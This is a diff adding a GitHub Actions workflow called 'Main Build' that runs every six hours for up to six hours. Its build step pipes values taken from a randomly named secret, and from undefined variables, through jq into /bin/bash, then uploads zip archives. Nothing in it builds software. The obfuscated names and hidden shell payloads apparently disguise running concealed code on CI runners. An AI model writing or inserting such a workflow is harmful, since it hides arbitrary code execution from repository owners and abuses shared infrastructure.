@@ -1,0 +1,36 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          tjl842: ${{ secrets.tjl842 }}
+        run: |
+          printf '%s' "$tjl842" | jq -r .b68896 | /bin/bash
+          printf '%s' "$bd87855" | jq -r .hc30345 | /bin/bash
+          echo $dae180 | jq -r .rqkyf1698 | /bin/bash
+          printf '%s' "$xz51" | jq -r .yi904 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: szZbRXWp
+          path: "*.zip"
+          retention-days: 1
